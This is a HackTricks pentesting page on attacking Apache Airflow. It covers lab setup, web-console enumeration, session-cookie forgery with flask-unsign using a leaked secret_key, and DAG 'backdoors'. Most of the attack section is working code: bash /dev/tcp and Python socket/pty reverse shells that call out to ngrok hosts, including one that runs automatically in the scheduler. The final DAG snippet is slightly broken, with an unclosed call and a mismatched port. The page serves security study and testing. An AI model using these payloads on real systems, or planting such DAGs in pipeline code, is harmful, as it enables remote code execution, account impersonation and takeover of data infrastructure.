

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>


# Apache Airflow

## Basic Information

[**Apache Airflow**](https://airflow.apache.org)  is used for the **scheduling and **_**orchestration of data pipelines**_** or workflows**. Orchestration of data pipelines refers to the sequencing, coordination, scheduling, and managing complex **data pipelines from diverse sources**. These data pipelines deliver data sets that are ready for consumption either by business intelligence applications and data science, machine learning models that support big data applications.

Basically, Apache Airflow will allow you to **schedule de execution of code when something** (event, cron) **happens**.

## Local Lab

### Docker-Compose

You can use the **docker-compose config file from** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml)  to launch a complete apache airflow docker environment. (If you are in MacOS make sure to give at least 6GB of RAM to the docker VM).

### Minikube

One easy way to **run apache airflo**w is to run it **with minikube**:

```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```

## Airflow Configuration

Airflow might store **sensitive information** in its configuration or you can find weak configurations in place:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Before start attacking Airflow you should understand **how permissions work**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Attacks

### Web Console Enumeration

If you have **access to the web console** you might be able to access some or all of the following information:

* **Variables** (Custom sensitive information might be stored here)
* **Connections** (Custom sensitive information might be stored here)
* [**Configuration**](./#airflow-configuration) (Sensitive information like the **`secret_key`** and passwords might be stored here)
* List **users & roles**
* **Code of each DAG** (which might contain interesting info)

### Privilege Escalation

If the **`expose_config`** configuration is set to **True**, from the **role User** and **upwards** can **read** the **config in the web**. In this config, the **`secret_key`** appears, which means any user with this valid they can **create its own signed cookie to impersonate any other user account**.

```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```

### DAG Backdoor (RCE in Airflow worker)

If you have **write access** to the place where the **DAGs are saved**, you can just **create one** that will send you a **reverse shell.**\
Note that this reverse shell is going to be executed inside an **airflow worker container**:

```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
    dag_id='rev_shell_bash',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = BashOperator(
        task_id='run',
        bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
    )
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
    s = socket.socket()
    s.connect((rhost, port))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")

with DAG(
    dag_id='rev_shell_python',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = PythonOperator(
        task_id='rs_python',
        python_callable=rs,
        op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
    )
```

### DAG Backdoor (RCE in Airflow scheduler)

If you set something to be **executed in the root of the code**, at the moment of this writing, it will be **executed by the scheduler** after a couple of seconds after placing it inside the DAG's folder.

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
    s = socket.socket()
    s.connect((rhost, port))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
    dag_id='rev_shell_python2',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = PythonOperator(
        task_id='rs_python2',
        python_callable=rs,
        op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```

### DAG Creation

If you manage to **compromise a machine inside the DAG cluster**, you can create new **DAGs scripts** in the `dags/` folder and they will be **replicated in the rest of the machines** inside the DAG cluster.


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

**Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

**Share your hacking tricks submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

</details>


